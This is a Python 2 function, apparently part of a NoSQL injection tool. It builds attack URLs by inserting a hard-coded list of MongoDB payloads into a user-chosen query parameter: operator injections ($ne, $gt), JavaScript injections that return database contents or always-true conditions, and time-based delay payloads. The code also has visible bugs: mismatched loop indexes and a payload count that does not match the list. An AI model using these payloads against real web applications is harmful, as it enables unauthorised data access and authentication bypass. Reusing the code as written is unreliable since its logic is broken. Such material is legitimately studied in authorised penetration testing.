def buildAttackUri(origUri, randValue):
    attackSum = 18
    attackSet=["","","","","","","","","","","","","","","","","","",""]
    attackSet[0] = "=" + randValue + "&"
    attackSet[1] = "[$ne]=" + randValue + "&"
    attackSet[2] =  "=a'; return db.a.find(); var dummy='!" + "&"
    attackSet[3] = "=1; return db.a.find(); var dummy=1" + "&"
    attackSet[4] ="=a'; return db.a.findOne(); var dummy='!" + "&"
    attackSet[5]="=1; return db.a.findOne(); var dummy=1" + "&"
    attackSet[6]="=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
    attackSet[7]="=1; return this.a !=" + randValue + "; var dummy=1" + "&"
    attackSet[8]="[$gt]=&"
    attackSet[9]="=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
    attackSet[10]="=a\"; return db.a.find(); var dummy='!" + "&"
    attackSet[11]="=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
    attackSet[12]="=a\"; return db.a.findOne(); var dummy=\"!" + "&"
    attackSet[13]="=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
    attackSet[14]="a'; return true; var dum='a"
    attackSet[15]="1; return true; var dum=2"
    attackSet[16]="=a\'; ---"
    attackSet[17]="=1; if ---"
    attackSet[18]="=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
    paramName = []
    paramValue = []
    uriArray = ["","","","","","","","","","","","","","","","","","",""]

    try:
        split_uri = origUri.split("?")
        params = split_uri[1].split("&")

    except:
        raw_input(
            "Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
        return

    for item in params:
        index = item.find("=")
        paramName.append(item[0:index])
        paramValue.append(item[index + 1:len(item)])

    menuItem = 1
    print "List of parameters:"
    for params in paramName:
        print str(menuItem) + "-" + params
        menuItem += 1

    try:
        injIndex = raw_input("Which parameter should we inject? ")
        injOpt = str(paramName[int(injIndex) - 1])
        print "Injecting the " + injOpt + " parameter..."

    except:
        raw_input("Something went wrong.  Press enter to return to the main menu...")
        return
    for index in range(0,attackSum):
        uriArray[index] = split_uri[0] + "?"
    index_paramName = 0
    for item in paramName:
        if item == injOpt:
            for index in range(0,attackSum):
                uriArray[index] += paramName[index_paramName] + attackSet[index]
        else:
            for index in range(0,attackSum):
                uriArray[index] += paramName[index_paramName] + "=" + paramValue[index] + "&"
    index_paramName+=1
    for index in range(0,attackSum):
        uriArray[index]=uriArray[index][:-1]
    return uriArray